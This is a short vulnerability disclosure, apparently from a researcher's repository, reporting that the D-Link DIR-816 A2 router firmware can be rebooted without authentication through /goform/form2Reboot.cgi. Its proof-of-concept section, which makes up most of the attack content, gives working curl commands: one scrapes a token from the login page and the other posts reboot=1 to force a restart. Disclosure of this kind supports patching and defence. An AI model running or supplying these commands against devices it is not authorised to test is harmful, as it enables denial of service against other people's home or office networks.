# D-link DIR-816 A2_v1.10CNB04.img reset router without authentication

## Firmware information

- Manufacturer's address：https://www.dlink.com/

- Firmware download address ： http://tsd.dlink.com.tw/GPL.asp

## Affected version

![](https://github.com/z1r00/IOT_Vul/blob/main/dlink/dir816/img/vuln2.png)

The picture above shows the latest firmware for this version

## Vulnerability details

![](https://github.com/z1r00/IOT_Vul/blob/main/dlink/Dir816/form2Reboot_cgi/vuln1.png)

Vulnerability occurs in /goform/form2Reboot.cgi, The reboot value is 1 to execute the reboot statement

## Poc

The first thing you need to do is to get the tokenid
```
curl http://192.168.0.1/dir_login.asp | grep tokenid
```

Then run the following poc

```
curl -i -X POST http://192.168.0.1/goform/form2Reboot.cgi -d tokenid=xxxxx -d 'reboot=1'
```

The router will then reboot
